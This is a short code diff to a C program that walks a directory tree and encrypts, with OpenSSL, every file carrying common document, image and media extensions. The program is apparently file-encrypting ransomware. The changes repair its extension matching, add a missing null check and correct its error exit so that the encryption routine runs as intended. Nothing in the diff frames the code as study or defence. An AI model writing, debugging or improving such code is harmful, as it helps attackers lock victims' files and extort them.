@@ -6,12 +6,10 @@
 #include <openssl/err.h>
 #include <openssl/rand.h>
 
-char *const extensions[] = {"jpg", "gif", "jpeg", "png", "doc", "docx", "xls",
-      "xlsx", "ppt", "pptx", "mp3", "mp4", "pdf"};
+char *const extensions[] = {".jpg", ".gif", ".jpeg", ".png", ".doc", ".docx", ".xls",
+      ".xlsx", ".ppt", ".pptx", ".mp3", ".mp4", ".pdf"};
 const int extensionsSize = 13;
 const int descriptors = 10;
-//static const int BLOCK_SIZE = 16;
-//static const int KEY_SIZE = 32;
 #define BLOCK_SIZE 16
 #define KEY_SIZE 32
 
@@ -28,8 +26,8 @@ static struct enc_status status;
 void handleErrors(int error) {
 	if (!error) {
 		ERR_print_errors_fp(stderr);
+		exit(EXIT_FAILURE);
 	}
-	exit(EXIT_FAILURE);
 }
 
 void encryptFile(const char *name) {
@@ -66,10 +64,12 @@ void encryptFile(const char *name) {
 int shouldEncrypt(const char *name, const struct stat *stats, int flag, struct FTW *path) {
 	char *extension = strrchr(name + path->base, '.');
 
-	for (int i = 0; i < extensionsSize; i++) {
-		if (strcmp(extension, extensions[i]) == 0 && flag == FTW_F) {
-			encryptFile(name);
-			return 0;
+	if (extension) {
+		for (int i = 0; i < extensionsSize; i++) {
+			if (strcmp(extension, extensions[i]) == 0 && flag == FTW_F) {
+				encryptFile(name);
+				return 0;
+			}
 		}
 	}
 
